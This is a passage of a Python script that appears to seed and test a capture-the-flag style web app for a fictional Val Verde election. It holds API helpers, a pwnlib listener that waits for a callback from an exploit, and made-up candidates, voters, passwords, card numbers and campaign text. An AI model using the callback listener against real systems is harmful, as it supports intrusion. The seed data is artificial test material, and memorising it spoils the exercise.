        log(f"{logCtx} Created question: {response.json()['id']}")
        # Sample response
        """
        {"id":2,"message":"Question created successfully"}
        """
        return None, response.json()

    def answer_question(self, logCtx, authToken, questionId, answer): # return (error, response json)
        response = requests.post(f"{self.frontend}/api/answers", json={
            "question_id": questionId,
            "answer_text": answer
        }, headers={
            "Authorization": authToken
        }, verify=False, timeout=REQUEST_TIMEOUT)
        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - failed to answer question: {response.status_code} - {response.text}", None
        log(f"{logCtx} Answered question: {questionId} - {response.json()['answer']['ID']}")
        # Sample response 
        """
        {
            "answer": {
                "ID": 1,
                "QuestionID": 2,
                "AnswerText": "good question",
                "CreatedAt": "2025-05-25T17:35:00Z",
                "AnswererName": "Esteban de Souza"
            },
            "id": 1,
            "message": "Answer created successfully"
        }
        """
        return None, response.json()

    # ===================================================================================
    # Attack Helpers
    # ===================================================================================

    def listener(self, logCtx, port, queue):
        context.log_level = "error" # reduce noise from pwnlib
        log(f"{logCtx} Listening on port {port} for connections...")
        status = FAILURE
        try:
            server = listen(port)
            server.settimeout(10)
            connection = server.wait_for_connection()
            log(f"{logCtx} Got connection from {connection.rhost} on port {connection.rport}")
            status = SUCCESS
        except Exception as e:
            log(f"{logCtx} Failed to recieve connection from exploit - {e}")
            status = FAILURE
        finally:
            server.close()
            
        
        queue.put(status)
        return status

# ===================================================================================
# Dataset
# ===================================================================================

CANDIDATES = [
    ("Esteban de Souza", "esteban.desouza@gmail.com", "Esteban!2025", "https://images.pexels.com/photos/2182970/pexels-photo-2182970.jpeg?auto=compress&cs=tinysrgb&w=600"),
    ("Arius Perez", "arius.perez@yahoo.com", "Arius#4567", "https://images.pexels.com/photos/1181519/pexels-photo-1181519.jpeg?auto=compress&cs=tinysrgb&w=600"),
    ("Raphael Velasquez", "raphael.velasquez@hotmail.com", "Raph@7890", "https://images.pexels.com/photos/2834009/pexels-photo-2834009.jpeg?auto=compress&cs=tinysrgb&w=600"),
    ("Gen. Ramon Esperanza", "ramon.esperanza@outlook.com", "Esperanza#2025", "https://images.pexels.com/photos/3776969/pexels-photo-3776969.jpeg?auto=compress&cs=tinysrgb&w=600"),
    ("Joel Plata", "joel.plata@icloud.com", "Plata$Secure12", "https://images.pexels.com/photos/3777946/pexels-photo-3777946.jpeg?auto=compress&cs=tinysrgb&w=600"),
    ("Sofia da Silva", "sofia.dasilva@gmail.com", "Sofia*3456", "https://images.pexels.com/photos/762020/pexels-photo-762020.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1"),
    ("Ana Paula Espinoza", "ana.espinoza@yahoo.com", "AnaEspinoza!67", "https://images.pexels.com/photos/7648239/pexels-photo-7648239.jpeg?auto=compress&cs=tinysrgb&w=600"),
    ("Vera Gomes", "vera.gomes@hotmail.com", "Vera@8901", "https://images.pexels.com/photos/3807770/pexels-photo-3807770.jpeg?auto=compress&cs=tinysrgb&w=600"),
    ("Xavier Gonzalez", "xavier.gonzalez@outlook.com", "Xavier#1234", "https://images.pexels.com/photos/32063728/pexels-photo-32063728/free-photo-of-black-and-white-portrait-of-man-in-white-jacket.jpeg?auto=compress&cs=tinysrgb&w=600"),
    ("Pedro Galeano", "pedro.galeano@icloud.com", "Galeano$4567", "https://images.pexels.com/photos/32128925/pexels-photo-32128925/free-photo-of-black-and-white-portrait-of-a-dog-behind-a-gate.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1"),
]

VOTERS = [
    ("Juan Dominguez", "juan.dominguez@gmail.com", "JuanD!2025"),
    ("Maria Sanchez", "maria.sanchez@yahoo.com", "MariaS#89"),
    ("Lucia Fernandez", "lucia.fernandez@hotmail.com", "LuciaF@123"),
    ("Carlos Ramirez", "carlos.ramirez@outlook.com", "CarlosR#456"),
    ("Diego Morales", "diego.morales@icloud.com", "DiegoM$789s"),
    ("Isabel Torres", "isabel.torres@gmail.com", "IsabelT*2025"),
    ("Mateo Alvarez", "mateo.alvarez@yahoo.com", "MateoA!671"),
    ("Camila Ortiz", "camila.ortiz@hotmail.com", "CamilaO@890"),
    ("Javier Castillo", "javier.castillo@outlook.com", "JavierC#12"),
    ("Pablo Herrera", "pablo.herrera@icloud.com", "PabloH$34sdf"),
    ("Luis Martinez", "luis.martinez@gmail.com", "LuisM!56s2"),
    ("Elena Lopez", "elena.lopez@yahoo.com", "ElenaL#7812"),
    ("Santiago Vargas", "santiago.vargas@hotmail.com", "SantiagoV@90"),
    ("Valeria Rojas", "valeria.rojas@outlook.com", "ValeriaR#23"),
    ("Miguel Navarro", "miguel.navarro@icloud.com", "MiguelN$45"),
    ("Sofia Mendoza", "sofia.mendoza@gmail.com", "SofiaM*671"),
    ("Andres Gutierrez", "andres.gutierrez@yahoo.com", "AndresG!89"),
    ("Paula Suarez", "paula.suarez@hotmail.com", "PaulaS@013"),
    ("Hector Rivera", "hector.rivera@outlook.com", "HectorR#34"),
    ("Clara Vargas", "clara.vargas@icloud.com", "ClaraV$5621"),
    ("Samuel Torres", "samuel.torres@gmail.com", "SamuelT!78"),
    ("Teresa Gomez", "teresa.gomez@yahoo.com", "TeresaG#90"),
    ("Victor Delgado", "victor.delgado@hotmail.com", "VictorD@23"),
    ("Ana Morales", "ana.morales@outlook.com", "AnaM#4512a2"),
    ("Ximena Perez", "ximena.perez@icloud.com", "XimenaP$67"),
    ("Yolanda Castro", "yolanda.castro@gmail.com", "YolandaC*89"),
    ("Zoe Ramirez", "zoe.ramirez@yahoo.com", "ZoeR!01123"),
    ("Adrian Vargas", "adrian.vargas@hotmail.com", "AdrianV@34"),
    ("Bruno Castillo", "bruno.castillo@outlook.com", "BrunoC#56"),
    ("Claudia Herrera", "claudia.herrera@icloud.com", "ClaudiaH$78"),
]

PLATFORMS = [
    "I stand for economic growth, job creation, and a thriving Val Verde. Together, we can build a prosperous future for all citizens by fostering innovation, supporting local businesses, and creating opportunities for everyone to succeed in a competitive global economy.",
    "My platform focuses on improving education, ensuring every child in Val Verde has access to quality schools and resources. I will work to modernize classrooms, provide better training for teachers, and ensure that every student has the tools they need to excel academically and beyond.",
    "I am committed to environmental sustainability, protecting Val Verde's natural beauty for generations to come. This includes investing in renewable energy, reducing pollution, and preserving our parks and wildlife through responsible policies and community engagement.",
    "Healthcare is a right, not a privilege. I will work to ensure affordable and accessible healthcare for all residents of Val Verde by expanding coverage, reducing costs, and improving the quality of care through innovative solutions and partnerships.",
    "Public safety is my priority. I will support our law enforcement and invest in community programs to reduce crime. By fostering trust between police and citizens, we can create safer neighborhoods and a stronger sense of security for everyone.",
    "I will fight for small businesses, providing incentives and support to help them thrive in Val Verde's economy. This includes reducing unnecessary regulations, offering tax breaks, and creating programs to help entrepreneurs succeed in their ventures.",
    "Transportation infrastructure is key. I will work to improve roads, public transit, and reduce traffic congestion. By investing in modern transportation solutions, we can make commuting easier, reduce emissions, and connect our communities more effectively.",
    "Affordable housing is essential. I will advocate for policies that ensure everyone in Val Verde has a place to call home. This includes increasing housing supply, providing assistance to low-income families, and addressing homelessness with compassion and action.",
    "I believe in transparency and accountability in government. I will work to restore trust in our public institutions by implementing open data initiatives, reducing corruption, and ensuring that every decision is made with the best interests of Val Verde's citizens in mind.",
    "My platform includes expanding access to technology and internet connectivity for all Val Verde residents. By bridging the digital divide, we can empower our communities with the tools they need to succeed in education, work, and daily life.",
    "I will prioritize mental health services, ensuring that everyone in Val Verde has access to the care they need. This includes increasing funding for mental health programs, reducing stigma, and integrating mental health care into our broader healthcare system.",
    "I am dedicated to supporting our veterans and ensuring they receive the benefits and respect they deserve. This includes improving access to healthcare, job training, and housing for those who have served our country with honor and dedication.",
    "Education reform is crucial. I will work to modernize our schools and provide better opportunities for students. This includes updating curricula, investing in STEM programs, and ensuring that every child in Val Verde has access to a world-class education.",
    "I will advocate for renewable energy initiatives to make Val Verde a leader in clean energy solutions. By investing in solar, wind, and other sustainable technologies, we can reduce our carbon footprint and create green jobs for our community.",
    "My platform includes promoting arts and culture, enriching the lives of Val Verde residents through creativity. By supporting local artists, funding cultural programs, and preserving our heritage, we can foster a vibrant and inclusive community.",
    "I will work to strengthen community engagement, ensuring every voice in Val Verde is heard and valued. This includes hosting town halls, creating online platforms for feedback, and encouraging active participation in local decision-making processes.",
    "I am committed to reducing taxes for middle-class families while ensuring essential services are funded. By managing our budget responsibly and eliminating wasteful spending, we can provide relief to hardworking families without compromising public services.",
    "I will focus on improving public parks and recreational facilities for the enjoyment of all Val Verde citizens. This includes upgrading playgrounds, maintaining green spaces, and creating new opportunities for outdoor activities and community events.",
    "My platform includes addressing food insecurity and ensuring no family in Val Verde goes hungry. By supporting food banks, creating community gardens, and implementing programs to reduce waste, we can ensure that everyone has access to nutritious meals.",
    "I will work to enhance public education on civic responsibilities and encourage active participation in democracy. By teaching the importance of voting, volunteering, and community involvement, we can build a stronger and more engaged society in Val Verde.",
]

ATTACKER_PLATFORMS = [
    "Don't vote for me, vote for the other guy. I don't care about you, I just want your money.",
    "I don't care about the environment, I just want to get elected. Vote for me and I'll make sure to destroy Val Verde's natural beauty.",
    "I don't care about education, I just want to get elected. Vote for me and I'll make sure to cut funding for schools.",
    "I don't care about healthcare, I just want to get elected. Vote for me and I'll make sure to cut funding for hospitals.",
]

BIOS = [
    "A dedicated leader with a vision for a brighter future, committed to serving the people of Val Verde with integrity, transparency, and a focus on building a community where everyone can thrive. With years of experience in public service, they aim to bring innovative solutions to the challenges facing our region.",
    "A passionate advocate for education reform, striving to ensure every child in Val Verde has access to quality learning opportunities. They believe in modernizing schools, empowering teachers, and creating an environment where students can excel academically and personally, preparing them for a successful future.",
    "An environmentalist at heart, focused on preserving Val Verde's natural beauty and promoting sustainable living practices. They are dedicated to implementing policies that protect our parks, reduce pollution, and invest in renewable energy to ensure a healthier planet for future generations.",
    "A healthcare professional turned public servant, determined to make affordable healthcare accessible to all residents of Val Verde. They bring firsthand experience in addressing healthcare challenges and are committed to improving the quality and availability of medical services for everyone.",
    "A small business owner who understands the challenges of entrepreneurship, ready to champion economic growth and job creation. They aim to provide resources, reduce barriers, and foster an environment where local businesses can flourish and contribute to a thriving economy.",
    "A community organizer with a proven track record of bringing people together to solve local issues and create lasting change. They are passionate about empowering residents, fostering collaboration, and ensuring that every voice in Val Verde is heard and valued.",
    "A former teacher who believes in the power of education to transform lives and is committed to improving Val Verde's schools. They advocate for better funding, updated curricula, and programs that prepare students for the demands of a rapidly changing world.",
    "A veteran dedicated to supporting fellow service members and ensuring they receive the benefits and respect they deserve. They are committed to addressing issues such as healthcare, housing, and job training for those who have served our country with honor.",
    "A technology enthusiast aiming to bridge the digital divide and bring cutting-edge innovations to Val Verde's communities. They believe in expanding internet access, promoting digital literacy, and leveraging technology to improve education, healthcare, and economic opportunities.",
    "A lifelong Val Verde resident with a deep love for the community, ready to fight for affordable housing and equitable opportunities. They are committed to addressing homelessness, increasing housing availability, and ensuring that every family has a safe and stable place to call home.",
    "A public safety advocate focused on fostering trust between law enforcement and citizens to create safer neighborhoods. They aim to implement community-based programs, improve training for officers, and build partnerships that enhance security and mutual respect.",
    "A transportation expert with a plan to modernize Val Verde's infrastructure and reduce traffic congestion for all residents. They are dedicated to improving roads, expanding public transit options, and creating sustainable solutions that connect communities and reduce environmental impact.",
    "A mental health advocate working to expand access to care and reduce stigma surrounding mental health issues in Val Verde. They are committed to increasing funding for mental health services, integrating care into broader healthcare systems, and ensuring that no one feels alone in their struggles.",
    "A champion for the arts, committed to enriching Val Verde's cultural landscape and supporting local artists and creators. They believe in funding cultural programs, preserving heritage, and fostering creativity to build a vibrant and inclusive community for all.",
    "A fiscal conservative dedicated to reducing taxes for middle-class families while maintaining essential public services. They aim to manage the budget responsibly, eliminate wasteful spending, and ensure that resources are allocated effectively to benefit all residents.",
    "A parent and PTA leader who understands the importance of investing in Val Verde's children and their future. They are passionate about improving schools, supporting extracurricular programs, and creating opportunities that help young people reach their full potential.",
    "A renewable energy advocate with a vision to make Val Verde a leader in clean energy and environmental sustainability. They are focused on investing in solar, wind, and other renewable technologies to reduce carbon emissions, create green jobs, and protect our environment.",
    "A former nonprofit director with a passion for addressing food insecurity and ensuring no family in Val Verde goes hungry. They are dedicated to supporting food banks, reducing waste, and implementing innovative programs that provide nutritious meals to those in need.",
    "A civic engagement enthusiast determined to empower Val Verde residents to participate actively in local governance. They believe in fostering transparency, hosting town halls, and creating platforms for dialogue to ensure that every citizen has a say in shaping the community's future.",
    "A parks and recreation advocate who believes in the importance of green spaces and outdoor activities for community well-being. They are committed to upgrading parks, maintaining recreational facilities, and creating opportunities for residents to connect with nature and each other.",
]

ATTACKER_BIOS = [
    "I grew up rich, and I will always be rich. I don't care about you, I just want your money.",
    "I don't care about the environment, I just want to get elected. Vote for me and I'll make sure to destroy Val Verde's natural beauty.",
    "I don't care about education, I just want to get elected. Vote for me and I'll make sure to cut funding for schools.",
]

PAYMENT_INFO = [
    ("4532756279624064", "John Doe", 1, 2025, "123"),
    ("5424180279791732", "Jane Smith", 2, 2026, "456"),
    ("3714496353984310", "Alice Johnson", 3, 2027, "789"),
    ("3056930902590400", "Bob Brown", 4, 2028, "321"),
    ("6011111111111117", "Charlie Davis", 5, 2029, "654"),
    ("2131415161718190", "Diana Evans", 6, 2030, "987"),
    ("3566002020360505", "Ethan Wilson", 7, 2031, "111"),
    ("6759649826438453", "Fiona Harris", 8, 2032, "222"),
    ("4532015112830366", "George Clark", 9, 2033, "333"),
    ("5431111111111111", "Hannah Lewis", 10, 2034, "444"),
    ("3714496353984320", "Ian Walker", 11, 2035, "555"),
    ("3056930902590500", "Julia Hall", 12, 2036, "666"),
    ("6011000990139424", "Kevin Allen", 1, 2037, "777"),
    ("2131415161721820", "Laura Young", 2, 2038, "888"),
    ("3566002020360506", "Michael King", 3, 2039, "999"),
    ("6759649826438454", "Nina Scott", 4, 2040, "000"),
    ("4532015112830367", "Oliver Adams", 5, 2041, "112"),
    ("5432111111111112", "Paula Baker", 6, 2042, "223"),
    ("3714496353984330", "Quinn Carter", 7, 2043, "334"),
    ("3056930902590600", "Rachel Turner", 8, 2044, "445"),
]

QUESTIONS = [
    "What is your plan to improve education in Val Verde?",
    "How will you address the issue of homelessness in our community?",
    "What steps will you take to promote economic growth and job creation?",
    "How do you plan to tackle climate change and protect our environment?",
    "What is your stance on healthcare access for all residents?",
    "How will you ensure public safety and reduce crime in Val Verde?",
    "What are your plans for improving transportation infrastructure?",
    "How do you intend to support small businesses in our area?",
    "What measures will you take to enhance community engagement and transparency in government?",
    "How will you address food insecurity and support local food banks?",
    "What is your vision for improving mental health services in Val Verde?",
    "How will you promote renewable energy and reduce carbon emissions?",
    "What steps will you take to improve internet access and digital literacy?",
    "How do you plan to support veterans and their families in our community?",
    "What is your approach to ensuring affordable housing for all residents?",
    "How will you preserve and expand public parks and recreational facilities?",
    "What is your plan to improve public transportation options in Val Verde?",
    "How will you address the rising cost of living in our community?",
    "What steps will you take to promote arts and culture in Val Verde?",
    "How do you plan to improve the quality of public schools in our area?",
    "What is your strategy for reducing traffic congestion in Val Verde?",
    "How will you ensure that local government remains accountable to the people?",
    "What is your plan to address the opioid crisis in our community?",
    "How will you support senior citizens and improve services for them?",
    "What steps will you take to improve disaster preparedness and response?",
    "How do you plan to attract new businesses and industries to Val Verde?",
    "What is your approach to improving water quality and conservation?",
    "How will you ensure that marginalized communities have a voice in local government?",
    "What is your plan to reduce waste and promote recycling in Val Verde?",
    "How will you address the challenges faced by working parents in our community?",
    "What steps will you take to improve public safety in schools?",
    "How do you plan to support youth programs and extracurricular activities?",
    "What is your vision for improving access to public libraries and resources?",
    "How will you address the issue of income inequality in Val Verde?",
    "What is your plan to improve pedestrian and cyclist safety in our community?",
    "How will you ensure that public services are accessible to people with disabilities?",
    "What steps will you take to promote diversity and inclusion in Val Verde?",
    "How do you plan to improve emergency medical services in our area?",
    "What is your approach to reducing air pollution in Val Verde?",
    "How will you support farmers and promote sustainable agriculture?",
]

ANSWERS = [
    "Thank you for your question. I believe in the power of community and the strength of our shared values.",
    "That's an important topic. My focus has always been on creating opportunities for everyone to succeed.",
    "I appreciate your concern. My track record shows my commitment to making a difference in people's lives.",
    "Thank you for bringing that up. I am dedicated to ensuring a brighter future for all of us.",
    "That's a great question. I have always prioritized listening to the needs of our community.",
    "I understand your concern. My leadership is rooted in transparency and accountability.",
    "Thank you for asking. I am committed to working tirelessly for the betterment of our community.",
    "That's an excellent point. My vision is to create a thriving and inclusive society for everyone.",
    "I appreciate your question. My experience has prepared me to tackle the challenges we face together.",
    "Thank you for raising that issue. I am focused on building a stronger and more resilient community.",
    "That's a valid concern. My approach has always been to bring people together to find solutions.",
    "Thank you for your input. I am passionate about making a positive impact in every aspect of our lives.",
    "That's a great question. My dedication to public service drives me to address the needs of our community.",
    "I appreciate your concern. My goal is to ensure that everyone has the opportunity to thrive.",
    "Thank you for asking. My leadership is about creating a future where everyone can succeed.",
    "That's an important issue. My focus is on fostering innovation and progress for our community.",
    "I understand your concern. My commitment is to work collaboratively to achieve meaningful change.",
    "Thank you for bringing that up. My vision is to create a community where everyone feels valued.",
    "That's a great point. My experience has taught me the importance of listening and taking action.",
    "I appreciate your question. My dedication to public service is unwavering and focused on results.",
    "Thank you for raising that issue. My approach is to lead with integrity and a focus on solutions.",
    "That's a valid concern. My goal is to ensure that our community continues to grow and prosper.",
    "Thank you for your input. My passion is to create opportunities and improve the quality of life for all.",
    "That's a great question. My leadership is about building a future that we can all be proud of.",
    "I appreciate your concern. My focus is on creating a community that is inclusive and forward-thinking.",
    "Thank you for asking. My commitment is to work hard every day to make a difference in people's lives.",
    "That's an important issue. My vision is to create a society where everyone has a chance to succeed.",
    "I understand your concern. My dedication is to ensure that our community remains strong and vibrant.",
    "Thank you for bringing that up. My approach is to lead with compassion and a focus on results.",
    "That's a great point. My experience has shown me the importance of collaboration and innovation.",
    "I appreciate your question. My goal is to create a future where everyone has the opportunity to thrive.",
    "Thank you for raising that issue. My focus is on building a community that is resilient and inclusive.",
    "That's a valid concern. My leadership is about creating opportunities and fostering growth for all.",
    "Thank you for your input. My passion is to make a positive impact in every aspect of our community.",
    "That's a great question. My dedication to public service drives me to address the challenges we face.",
    "I appreciate your concern. My vision is to create a society where everyone feels valued and supported.",
    "Thank you for asking. My commitment is to work tirelessly to improve the lives of everyone in our community.",
    "That's an important issue. My focus is on fostering innovation and creating opportunities for all.",
    "I understand your concern. My dedication is to ensure that our community continues to thrive and grow.",
    "Thank you for bringing that up. My approach is to lead with integrity and a focus on collaboration.",
    "That's a great point. My experience has taught me the importance of listening and taking meaningful action.",
    "I appreciate your question. My goal is to create a future where everyone has the chance to succeed.",
    "Thank you for raising that issue. My focus is on building a community that is inclusive and forward-thinking.",
    "That's a valid concern. My leadership is about creating opportunities and fostering growth for everyone.",
    "Thank you for your input. My passion is to make a positive impact in every aspect of our community.",
    "That's a great question. My dedication to public service drives me to address the challenges we face.",
    "I appreciate your concern. My vision is to create a society where everyone feels valued and supported.",
    "Thank you for asking. My commitment is to work tirelessly to improve the lives of everyone in our community.",
    "That's an important issue. My focus is on fostering innovation and creating opportunities for all.",
    "I understand your concern. My dedication is to ensure that our community continues to thrive and grow.",
    "Bad question, moving on.",
    "I disagree with your question, but I respect your opinion.",
    "That's a loaded question. I prefer to focus on solutions rather than blame.",
    "I don't think that's a fair question. Let's talk about the real issues facing our community.",
    "That's a tough question. I believe in addressing the root causes of our problems.",
    "I don't think that's a relevant question. Let's focus on the future of Val Verde.",
    "Find my answer on social media.",
    "This is what is wrong with our society",
]


